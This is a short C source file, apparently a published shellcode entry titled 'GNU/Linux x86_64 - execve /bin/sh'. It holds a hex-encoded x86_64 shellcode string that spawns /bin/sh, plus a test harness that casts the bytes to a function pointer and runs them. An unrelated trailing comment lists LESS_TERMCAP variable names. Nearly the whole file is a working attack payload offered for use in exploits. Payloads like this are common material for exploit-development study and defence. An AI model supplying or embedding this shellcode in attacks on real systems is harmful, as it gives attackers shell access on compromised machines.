/*
 * ;Category: Shellcode
 * ;Title: GNU/Linux x86_64 - execve /bin/sh
 * ;Author: m4n3dw0lf
 * ;Github: https://github.com/m4n3dw0lf
 * ;Date: 14/06/2017
 * ;Architecture: Linux x86_64
 * ;Tested on : #1 SMP Debian 4.9.18-1 (2017-03-30) x86_64 GNU/Linux
 */

#include <stdio.h>


int main()
{
	unsigned char shellcode[] = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

	int (*ret)() = (int(*)())shellcode;
	ret();
}

// LESS_TERMCAP_mb  LESS_TERMCAP_md  LESS_TERMCAP_me  LESS_TERMCAP_se  LESS_TERMCAP_so  LESS_TERMCAP_ue  LESS_TERMCAP_us

